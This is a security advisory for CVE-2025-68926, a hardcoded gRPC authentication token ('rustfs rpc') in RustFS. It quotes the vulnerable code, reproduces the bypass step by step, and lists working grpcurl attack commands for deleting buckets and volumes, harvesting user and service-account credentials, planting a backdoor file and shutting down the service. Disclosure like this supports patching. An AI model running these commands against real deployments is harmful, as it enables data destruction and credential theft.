# [C] RustFS has a gRPC Hardcoded Token Authentication Bypass

## Summary
Severity: Critical
Advisory: GHSA-h956-rh7x-ppgj
CVE: CVE-2025-68926
CWE: CWE-287, CWE-798
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-12-30
Source: https://github.com/advisories/GHSA-h956-rh7x-ppgj
Type: github-advisory

## Affected
- crates.io: `rustfs` — affected >=1.0.0-alpha.13 <1.0.0-alpha.78

## Details
## Vulnerability Overview

### Description

RustFS implements gRPC authentication using a hardcoded static token `"rustfs rpc"` that is:
1. **Publicly exposed** in the source code repository
2. **Hardcoded** on both client and server sides
3. **Non-configurable** with no mechanism for token rotation
4. **Universally valid** across all RustFS deployments

Any attacker with network access to the gRPC port can authenticate using this publicly known token and execute privileged operations including data destruction, policy manipulation, and cluster configuration changes.

### CVSS 3.1 Score

**Score**: 9.8 (Critical)
**Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

- **Attack Vector (AV)**: Network - Exploitable remotely
- **Attack Complexity (AC)**: Low - No special conditions required
- **Privileges Required (PR)**: None - No authentication needed (bypassed)
- **User Interaction (UI)**: None - Fully automated exploitation
- **Scope (S)**: Unchanged - Impact contained to vulnerable component
- **Confidentiality (C)**: High - Complete data disclosure
- **Integrity (I)**: High - Complete data modification capability
- **Availability (A)**: High - Complete service disruption capability

---

## Vulnerable Code Analysis

### Server-Side Authentication (rustfs/src/server/http.rs:679-686)

```rust
#[allow(clippy::result_large_err)]
fn check_auth(req: Request<()>) -> std::result::Result<Request<()>, Status> {
    let token: MetadataValue<_> = "rustfs rpc".parse().unwrap();  // ⚠️ HARDCODED!

    match req.metadata().get("authorization") {
        Some(t) if token == t => Ok(req),
        _ => Err(Status::unauthenticated("No valid auth token")),
    }
}
```

**Issues**:
- Static token hardcoded as string literal
- No configuration mechanism (environment variable, file, etc.)
- Token visible in public GitHub repository
- Identical across all installations

### Client-Side Authentication (crates/protos/src/lib.rs:153-174)

```rust
pub async fn node_service_time_out_client(
    addr: &String,
) -> Result<NodeServiceClient<...>, Box<dyn Error>> {
    let token: MetadataValue<_> = "rustfs rpc".parse()?;  // ⚠️ SAME HARDCODED TOKEN!

    // ...

    Ok(NodeServiceClient::with_interceptor(
        channel,
        Box::new(move |mut req: Request<()>| {
            req.metadata_mut().insert("authorization", token.clone());
            Ok(req)
        }),
    ))
}
```

**Issues**:
- Client uses identical hardcoded token
- No secure token distribution mechanism
- Token cannot be rotated without code changes

### Service Integration (rustfs/src/server/http.rs:520-521)

```rust
let rpc_service = NodeServiceServer::with_interceptor(make_server(), check_auth);
let service = hybrid(s3_service, rpc_service);
```

The `check_auth` interceptor is applied to all gRPC services via `NodeServiceServer::with_interceptor`, protecting **all 50+ gRPC methods** in `node.proto` with the same weak authentication.

---

## Reproduction Steps

### Environment Setup

**Test Environment**:
- RustFS Server: `localhost:9000` (HTTP + gRPC hybrid service)
- RustFS Console: `localhost:9001`
- Container: `rustfs/rustfs:latest` (Docker Compose deployment)
- Default credentials: `rustfsadmin/rustfsadmin`

**Tools Required**:
- `grpcurl` v1.9.3+ (gRPC command-line client)
- RustFS proto files: `crates/protos/src/node.proto`

### Step 1: Verify Authentication is Enforced

**Test 1.1: Request without authentication token**

```bash
$ grpcurl -plaintext \
    -import-path /private/tmp/rustfs/crates/protos/src \
    -proto node.proto \
    -d '{}' \
    localhost:9000 node_service.NodeService/Ping
```

**Expected Result**: ✅ Authentication failure

```
ERROR:
  Code: Unauthenticated
  Message: No valid auth token
```

**Test 1.2: Request with incorrect token**

```bash
$ grpcurl -plaintext \
    -H 'authorization: wrong-token-12345' \
    -import-path /private/tmp/rustfs/crates/protos/src \
    -proto node.proto \
    -d '{}' \
    localhost:9000 node_service.NodeService/Ping
```

**Expected Result**: ✅ Authentication failure

```
ERROR:
  Code: Unauthenticated
  Message: No valid auth token
```

**Conclusion**: Authentication is properly enforced - unauthorized requests are rejected.

---

### Step 2: Extract Hardcoded Token from Source Code

**Public Source Code Analysis**:

```bash
$ git clone https://github.com/rustfs/rustfs.git
$ cd rustfs
$ grep -rn '"rustfs rpc"' --include='*.rs'
```

**Result**: ✅ Token found in public source code

```
rustfs/src/server/http.rs:680:    let token: MetadataValue<_> = "rustfs rpc".parse().unwrap();
crates/protos/src/lib.rs:153:    let token: MetadataValue<_> = "rustfs rpc".parse()?;
```

**Extracted Token**: `rustfs rpc`

---

### Step 3: Exploit - Authenticate Using Hardcoded Token

**Test 3.1: Successful authentication with hardcoded token**

```bash
$ grpcurl -plaintext \
    -H 'authorization: rustfs rpc' \
    -import-path /private/tmp/rustfs/crates/protos/src \
    -proto node.proto \
    -d '{}' \
    localhost:9000 node_service.NodeService/Ping
```

**Result**: 🔓 **AUTHENTICATION BYPASSED**

```json
{
  "version": "1",
  "body": "DAAAAAAABgAIAAQABgAAAAQAAAANAAAAaGVsbG8sIGNhbGxlcgAAAA=="
}
```

**Analysis**: Server accepted the hardcoded token and returned a successful response. Authentication completely bypassed.

---

### Step 4: Demonstrate Access to Sensitive Management APIs

**Test 4.1: Server Configuration Disclosure**

```bash
$ grpcurl -plaintext \
    -H 'authorization: rustfs rpc' \
    -import-path /private/tmp/rustfs/crates/protos/src \
    -proto node.proto \
    -d '{}' \
    localhost:9000 node_service.NodeService/ServerInfo
```

**Result**: ✅ **Complete server configuration disclosed**

```json
{
  "success": true,
  "serverProperties": "n6ZvbmxpbmWsMC4wLjAuMDo5MDAwoM0DhdkjMjAyNS0xMi0xOVQwNjo1NzoxOVpAMS4wLjAtYWxwaGEuNzaggawwLjAuMC4wOjkwMDCmb25saW5llNwAGq0vZGF0YS9ydXN0ZnMwwq0vZGF0YS9ydXN0ZnMwwsKib2ugACLAzwAAcxuhUAAAzwAAQCnCIAAAzwAAMvHfMAAAywAAAAAAAAAAywAAAAAAAAAAywAAAAAAAAAAywAAAAAAAAAAy0BL3vAPnWekwMDOADA+/c5/XK34wwAAANwAGq0vZGF0YS9ydXN0ZnMxwq0vZGF0YS9ydXN0ZnMxwsKib2ugACLAzwAAcxuhUAAAzwAAQCnCIAAAzwAAMvHfMAAAywAAAAAAAAAAywAAAAAAAAAAywAAAAAAAAAAywAAAAAAAAAAy0BL3vAPnWekwMDOADA+/c5/XK34wwAAAdwAGq0vZGF0YS9ydXN0ZnMywq0vZGF0YS9ydXN0ZnMywsKib2ugACLAzwAAcxuhUAAAzwAAQCnCIAAAzwAAMvHfMAAAywAAAAAAAAAAywAAAAAAAAAAywAAAAAAAAAAywAAAAAAAAAAy0BL3vAPnWekwMDOADA+/c5/XK34wwAAAtwAGq0vZGF0YS9ydXN0ZnMzwq0vZGF0YS9ydXN0ZnMzwsKib2ugACLAzwAAcxuhUAAAzwAAQCnCIAAAzwAAMvHfMAAAywAAAAAAAAAAywAAAAAAAAAAywAAAAAAAAAAywAAAAAAAAAAy0BL3vAPnWekwMDOADA+/c5/XK34wwAAAwGRAZUAAAAAAAAAoIA="
}
```

**Analysis**:
- Server returned complete configuration including storage paths, endpoint addresses, version info
- Binary data contains sensitive internal state (MessagePack encoded)
- Information disclosure confirmed

**Test 4.2: Disk Information Access**

```bash
$ grpcurl -plaintext \
    -H 'authorization: rustfs rpc' \
    -import-path /private/tmp/rustfs/crates/protos/src \
    -proto node.proto \
    -d '{}' \
    localhost:9000 node_service.NodeService/DiskInfo
```

**Result**: ✅ **Authenticated request accepted** (business logic error returned, not auth error)

```json
{
  "error": {
    "code": 36,
    "errorInfo": "io error can not find disk"
  }
}
```

**Analysis**:
- Request passed authentication (error is business logic, not authentication)
- Proves attacker has authenticated access to sensitive system information APIs

---

## Impact Analysis

### Affected APIs

All 50+ gRPC methods in `node_service.NodeService` are vulnerable:

#### 🔴 **CRITICAL Impact - Data Destruction**
- `DeleteBucket` - Delete production buckets
- `DeleteVolume` - Destroy entire storage volumes
- `DeleteUser` - Remove legitimate users
- `DeletePolicy` - Remove access control policies
- `DeleteServiceAccount` - Remove service accounts

#### 🔴 **CRITICAL Impact - Configuration Manipulation**
- `ReloadSiteReplicationConfig` - Corrupt cluster replication
- `SignalService` - Control service lifecycle
- `LoadPolicy` - Modify access control policies
- `LoadPolicyMapping` - Alter policy assignments

#### 🟠 **HIGH Impact - Unauthorized Data Access/Modification**
- `ReadAll` / `ReadAt` - Read arbitrary data
- `WriteAll` / `WriteStream` - Inject malicious data
- `RenameFile` / `RenameData` - Manipulate file system
- `UpdateMetadata` / `WriteMetadata` - Corrupt metadata

#### 🟠 **HIGH Impact - Privilege Escalation**
- `LoadUser` - Access user credentials
- `LoadServiceAccount` - Access service credentials
- `LoadGroup` - Access group memberships

#### 🟡 **MEDIUM Impact - Information Disclosure**
- `ServerInfo` - Server configuration disclosure
- `DiskInfo` - Storage configuration disclosure
- `GetMetrics` - Performance metrics disclosure
- `GetBucketStats` - Bucket statistics disclosure
- `LocalStorageInfo` - Storage system information
- `ListBucket` - Bucket enumeration

#### 🟡 **MEDIUM Impact - Cluster Operations**
- `MakeBucket` - Unauthorized bucket creation
- `HealBucket` - Trigger repair operations
- `BackgroundHealStatus` - Monitor internal operations

### Attack Scenarios

#### Scenario 1: Data Destruction

```bash
# Enumerate all buckets
grpcurl -plaintext -H 'authorization: rustfs rpc' \
  -d '{"options": "{}"}' \
  localhost:9000 node_service.NodeService/ListBucket

# Delete critical production bucket
grpcurl -plaintext -H 'authorization: rustfs rpc' \
  -d '{"bucket": "production-data"}' \
  localhost:9000 node_service.NodeService/DeleteBucket

# Delete entire storage volume
grpcurl -plaintext -H 'authorization: rustfs rpc' \
  -d '{"volume": "vol1"}' \
  localhost:9000 node_service.NodeService/DeleteVolume
```

**Impact**: Complete data loss, business disruption

#### Scenario 2: Credential Harvesting

```bash
# Extract user credentials
grpcurl -plaintext -H 'authorization: rustfs rpc' \
  -d '{"access_key": "admin"}' \
  localhost:9000 node_service.NodeService/LoadUser

# Extract service account credentials
grpcurl -plaintext -H 'authorization: rustfs rpc' \
  -d '{"access_key": "service-account"}' \
  localhost:9000 node_service.NodeService/LoadServiceAccount

# Exfiltrate IAM policies
grpcurl -plaintext -H 'authorization: rustfs rpc' \
  -d '{"name": "admin-policy"}' \
  localhost:9000 node_service.NodeService/LoadPolicy
```

**Impact**: Complete IAM compromise, lateral movement

#### Scenario 3: Backdoor Installation

```bash
# Inject malicious data into system paths
grpcurl -plaintext -H 'authorization: rustfs rpc' \
  -d '{"volume": "config", "path": "backdoor.sh", "buf": "..."}' \
  localhost:9000 node_service.NodeService/WriteAll

# Modify system configuration
grpcurl -plaintext -H 'authorization: rustfs rpc' \
  -d '{"bucket": "system", "path": ".rustfs.sys/config.json", "fi": "..."}' \
  localhost:9000 node_service.NodeService/WriteMetadata
```

**Impact**: Persistent compromise, further exploitation

#### Scenario 4: Cluster Disruption

```bash
# Corrupt replication configuration
grpcurl -plaintext -H 'authorization: rustfs rpc' \
  -d '{}' \
  localhost:9000 node_service.NodeService/ReloadSiteReplicationConfig

# Force service restart/shutdown
grpcurl -plaintext -H 'authorization: rustfs rpc' \
  -d '{"sig": 2}' \
  localhost:9000 node_service.NodeService/SignalService
```

**Impact**: Distributed system failure, data inconsistency

---

## Exploitation Preconditions

### Required Conditions

✅ **All conditions typically met in production deployments**:

1. **Network Access**: Attacker can reach gRPC port (9000/TCP)
   - RustFS binds to `0.0.0.0` by default (all interfaces)
   - Commonly exposed for distributed node communication

2. **Token Knowledge**: Token is publicly known
   - Available in public GitHub repository
   - Identical across all RustFS installations
   - Cannot be changed without code modification

3. **No Additional Security Controls**:
   - No mTLS/certificate-based authentication
   - No IP whitelisting (typically)
   - No VPN/network segmentation requirements
   - No rate limiting on authentication attempts

### Attack Complexity

**Complexity**: 🟢 **TRIVIAL**

- Single `grpcurl` command with hardcoded token
- No exploit development required
- No timing or race conditions
- No target-specific reconnaissance needed
- Fully automatable
- Works against any RustFS instance

**Time to Exploit**: < 1 minute

---

## Security Impact

### Confidentiality Impact: HIGH

- **Complete Data Disclosure**: All stored objects readable via `ReadAll`/`ReadAt`
- **Credential Exposure**: IAM users, service accounts, policies accessible
- **Configuration Disclosure**: Server, storage, cluster configuration leaked
- **Metrics Exposure**: Performance and usage metrics accessible

### Integrity Impact: HIGH

- **Data Modification**: Arbitrary data injection via `WriteAll`/`WriteStream`
- **Metadata Corruption**: File metadata tampering via `WriteMetadata`
- **Policy Manipulation**: IAM policies modifiable via `LoadPolicy`
- **Configuration Changes**: Cluster replication config alterable

### Availability Impact: HIGH

- **Data Destruction**: Buckets/volumes deletable via `DeleteBucket`/`DeleteVolume`
- **Service Disruption**: Service controllable via `SignalService`
- **Cluster Degradation**: Replication corruption via `ReloadSiteReplicationConfig`
- **Resource Exhaustion**: Arbitrary data writes, bucket creation

---

## Compliance & Regulatory Impact

### Standards Violated

#### PCI-DSS v4.0
- **Requirement 6.5.3**: Broken authentication
- **Requirement 8.2**: Strong authentication required
- **Requirement 8.6**: Multi-factor authentication required

#### OWASP Top 10 2021
- **A07:2021 - Identification and Authentication Failures**
  - Use of hard-coded credentials
  - Missing or ineffective authentication

#### CWE (Common Weakness Enumeration)
- **CWE-798**: Use of Hard-coded Credentials (Rank: 37/400)
- **CWE-1391**: Use of Weak Credentials
- **CWE-287**: Improper Authentication

#### NIST Cybersecurity Framework
- **PR.AC-1**: Access control mechanisms violated
- **PR.AC-7**: Authentication mechanisms insufficient

#### SOC 2 Type II
- **CC6.1**: Logical access controls inadequate
- **CC6.6**: Credential management controls missing

### Legal & Business Impact

- **Data Breach Notification**: GDPR Art. 33, CCPA §1798.150
- **Regulatory Fines**: GDPR up to €20M or 4% annual revenue
- **Customer Trust**: Severe reputational damage
- **Service Disruption**: SLA violations, customer compensation
- **Incident Response Costs**: Forensics, remediation, legal fees

---

## Proof of Concept

### Automated POC Script

**File**: `audit_analysis/poc_cve_2025_008_grpc_token_working.sh`

**Usage**:
```bash
chmod +x poc_cve_2025_008_grpc_token_working.sh
./poc_cve_2025_008_grpc_token_working.sh [target_host:port]
```

**Default Target**: `localhost:9000`

### POC Features

1. ✅ **Baseline Authentication Testing**
   - Verifies unauthenticated requests are rejected
   - Verifies incorrect tokens are rejected

2. ✅ **Exploit Demonstration**
   - Authenticates using hardcoded token
   - Calls `Ping` service successfully

3. ✅ **Sensitive API Access**
   - Accesses `ServerInfo` (configuration disclosure)
   - Accesses `DiskInfo` (system information)
   - Demonstrates authenticated access to management APIs

4. ✅ **Detailed Reporting**
   - Displays vulnerable code locations
   - Lists all affected APIs (50+ methods)
   - Provides CVSS scoring and impact analysis
   - Includes remediation recommendations

### POC Output Summary

```
[PHASE 1] Baseline Testing
  ✓ Without token: REJECTED (Unauthenticated)
  ✓ With wrong token: REJECTED (Unauthenticated)

[PHASE 2] Exploit
  ✓ With hardcoded token "rustfs rpc": ACCEPTED ✅

[PHASE 3] Sensitive API Access
  ✓ ServerInfo: SUCCESS - Configuration disclosed
  ✓ DiskInfo: SUCCESS - System information accessible

[RESULT] VULNERABILITY CONFIRMED
```

## Acknowledgements

We would like to thank **bilisheep** from the **Xmirror Security Team** for discovering and responsibly reporting this vulnerability.

## References
- https://github.com/rustfs/rustfs/security/advisories/GHSA-h956-rh7x-ppgj
- https://nvd.nist.gov/vuln/detail/CVE-2025-68926
- https://github.com/rustfs/rustfs
- https://github.com/rustfs/rustfs/releases/tag/1.0.0-alpha.78
